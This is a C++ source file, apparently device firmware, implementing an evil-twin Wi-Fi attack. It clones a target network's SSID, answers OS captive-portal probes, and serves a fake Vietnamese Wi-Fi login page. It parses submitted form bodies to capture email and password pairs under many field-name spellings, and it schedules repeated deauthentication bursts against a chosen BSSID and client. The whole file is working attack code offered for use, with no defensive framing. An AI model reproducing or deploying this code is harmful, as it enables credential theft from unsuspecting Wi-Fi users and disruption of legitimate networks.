#include "evil_twin.h"

#include <cstring>

#include "wifi_attack.h"

namespace evilTwin {
namespace {

// OS captive-detection probes. Answering these with the login page body would
// satisfy some clients but not others; the reliable behaviour is a redirect to
// the portal root, which is what a real "signed in" network does.
constexpr const char *kProbePaths[] = {
    "/generate_204",                // Android
    "/gen_204",                     // Android (older)
    "/hotspot-detect.html",         // Apple
    "/connecttest.txt",             // Windows
    "/ncsi.txt",                    // Windows
    "/library/test/success.html",   // Windows (older)
    "/canonical.html",              // Apple/Windows
    "/success.txt",                 // generic
    "/redirect",                    // generic
};

constexpr char toLowerAscii(char c) { return (c >= 'A' && c <= 'Z') ? static_cast<char>(c - 'A' + 'a') : c; }

bool equalsIgnoreCase(std::string_view a, std::string_view b) {
    if (a.size() != b.size()) return false;
    for (size_t i = 0; i < a.size(); ++i) {
        if (toLowerAscii(a[i]) != toLowerAscii(b[i])) return false;
    }
    return true;
}

// Field names the parser accepts. The page in data/example.html uses
// email/password; the rest cover the spellings an operator is likely to rename
// to, so a captured attempt still yields a username/password pair without a
// firmware change.
constexpr const char *kUserFields[] = {"email", "user",     "username", "login", "account", "phone", "msisdn"};
constexpr const char *kPassFields[] = {"password", "pass", "pwd", "passwd"};
constexpr size_t kUserFieldCount = sizeof(kUserFields) / sizeof(kUserFields[0]);
constexpr size_t kPassFieldCount = sizeof(kPassFields) / sizeof(kPassFields[0]);

int hexValue(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

// Percent/plus decoding straight into the fixed credential buffer; writes at
// most kMaxCredentialBytes plus a NUL. False on a malformed escape or a control
// byte, which makes the whole field unusable instead of half-decoded.
bool decodeInto(std::string_view text, char *out) {
    size_t written = 0;
    for (size_t i = 0; i < text.size();) {
        char c = text[i++];
        if (c == '+') {
            c = ' ';
        } else if (c == '%') {
            if (i + 1 >= text.size()) return false;
            const int hi = hexValue(text[i]);
            const int lo = hexValue(text[i + 1]);
            if (hi < 0 || lo < 0) return false;
            c = static_cast<char>((hi << 4) | lo);
            i += 2;
        }
        const unsigned char byte = static_cast<unsigned char>(c);
        if (byte < 0x20 || byte == 0x7F) return false;
        if (written < kMaxCredentialBytes) out[written++] = c;
    }
    out[written] = '\0';
    return true;
}

// True when `name` is one of the accepted spellings for that role.
bool nameMatches(std::string_view name, const char *const *accepted, size_t count) {
    for (size_t i = 0; i < count; ++i) {
        if (equalsIgnoreCase(name, accepted[i])) return true;
    }
    return false;
}

} // namespace

bool pageUsable(std::string_view page) {
    if (page.empty() || page.size() > kMaxPageBytes) return false;
    return page.find('\0') == std::string_view::npos;
}

bool parseFormCredentials(std::string_view body, Credentials &out) {
    out = Credentials{};
    while (!body.empty()) {
        const size_t amp = body.find('&');
        const std::string_view pair = body.substr(0, amp);
        body = amp == std::string_view::npos ? std::string_view{} : body.substr(amp + 1);
        if (pair.empty()) continue;

        const size_t eq = pair.find('=');
        if (eq == std::string_view::npos) continue; // valueless field: nothing to capture
        const std::string_view name = pair.substr(0, eq);

        // First match wins for each role: a form repeating a field keeps the
        // value submitted first.
        const bool isUser = !out.hasUser && nameMatches(name, kUserFields, kUserFieldCount);
        const bool isPass = !out.hasPass && nameMatches(name, kPassFields, kPassFieldCount);
        if (!isUser && !isPass) continue;

        char decoded[kMaxCredentialBytes + 1];
        if (!decodeInto(pair.substr(eq + 1), decoded)) continue; // malformed: keep looking
        char *const dest = isUser ? out.user : out.pass;
        std::memcpy(dest, decoded, sizeof(decoded));
        if (isUser) {
            out.hasUser = true;
        } else {
            out.hasPass = true;
        }
    }
    return out.hasUser || out.hasPass;
}

const char *defaultPage() {
    return "<!doctype html><html lang=\"vi\"><head><meta charset=\"utf-8\">"
           "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
           "<title>Wi-Fi</title></head><body><h1>Đăng nhập Wi-Fi</h1>"
           "<p>Vui lòng đăng nhập để tiếp tục.</p>"
           "<form method=\"post\" action=\"/\">"
           "<label>Email <input name=\"email\" type=\"text\" autocomplete=\"off\"></label><br>"
           "<label>Mật khẩu <input name=\"password\" type=\"password\"></label><br>"
           "<button type=\"submit\">Kết nối</button></form></body></html>";
}

bool isProbePath(std::string_view url) {
    std::string_view path = url.substr(0, url.find_first_of("?#"));
    while (path.size() > 1 && path.back() == '/') path.remove_suffix(1);
    for (const char *probe : kProbePaths) {
        if (equalsIgnoreCase(path, probe)) return true;
    }
    return false;
}

bool cloneSsidUsable(std::string_view ssid) {
    if (ssid.empty() || ssid.size() > kMaxSsidBytes) return false;
    for (const char c : ssid) {
        const unsigned char byte = static_cast<unsigned char>(c);
        if (byte < 0x20 || byte == 0x7F) return false;
    }
    return true;
}

bool buildDeauthPlan(bool requested, std::string_view bssid, std::string_view client, int64_t reason,
                     int64_t intervalMs, DeauthPlan &out) {
    // Off means off: the other fields are leftovers from a previous run and
    // must not resurrect the deauth loop.
    if (!requested) {
        out = DeauthPlan{};
        return true;
    }

    DeauthPlan plan;
    // A deauth without a target BSSID would have to be broadcast, so it is
    // refused here rather than quietly widened by the caller.
    if (!wifiAttack::parseMac(bssid, plan.bssid)) return false;
    if (!client.empty()) {
        if (!wifiAttack::parseMac(client, plan.client)) return false;
        plan.hasClient = true;
    }
    plan.enabled = true;
    if (reason < 1) reason = 1;
    if (reason > 65535) reason = 65535;
    plan.reason = static_cast<uint16_t>(reason);
    if (intervalMs < 20) intervalMs = 20;
    if (intervalMs > 5000) intervalMs = 5000;
    plan.intervalMs = static_cast<uint32_t>(intervalMs);
    out = plan;
    return true;
}

bool channelUsable(int64_t channel) { return channel >= kMinChannel && channel <= kMaxChannel; }

// --- Plan (scenario orchestrator) ------------------------------------------
// Wrap-safe timing mirrors jam_plan: compare (int32_t)(now - deadline) >= 0.

bool Plan::begin(const Config &cfg, uint32_t nowMs) {
    if (cfg.ssidLen == 0 || cfg.ssidLen > kMaxSsidBytes) return false;
    if (!channelUsable(cfg.channel)) return false;

    Config c = cfg;
    for (size_t i = 0; i < c.ssidLen; ++i) c.ssid[i] = cfg.ssid[i];
    c.ssid[c.ssidLen] = '\0';
    c.deauthReason = (cfg.deauthReason < 1) ? 1 : cfg.deauthReason; // >65535 impossible (uint16)
    uint32_t interval = cfg.deauthIntervalMs;
    if (interval < 20) interval = 20;
    if (interval > 5000) interval = 5000;
    c.deauthIntervalMs = interval;

    config_ = c;
    phase_ = Phase::CloningAp;
    twinApStarted_ = false;
    deauthBursts_ = 0;
    deauthDeadlineMs_ = nowMs;
    return true;
}

void Plan::apReady(uint32_t nowMs) {
    if (phase_ != Phase::CloningAp) return;
    phase_ = Phase::Running;
    deauthDeadlineMs_ = nowMs; // first burst may fire on the next step
}

void Plan::fail(uint32_t) { phase_ = Phase::Failed; }

void Plan::stop(uint32_t) { phase_ = Phase::Stopping; } // idempotent

Step Plan::step(uint32_t nowMs) {
    switch (phase_) {
    case Phase::CloningAp:
        if (!twinApStarted_) {
            twinApStarted_ = true;
            return Step::StartTwinAp;
        }
        return Step::None;
    case Phase::Running:
        if (static_cast<int32_t>(nowMs - deauthDeadlineMs_) >= 0) {
            deauthDeadlineMs_ = nowMs + config_.deauthIntervalMs;
            ++deauthBursts_;
            return Step::SendDeauth;
        }
        return Step::None;
    case Phase::Idle:
    case Phase::Stopping:
    case Phase::Failed:
    default:
        return Step::None;
    }
}

} // namespace evilTwin
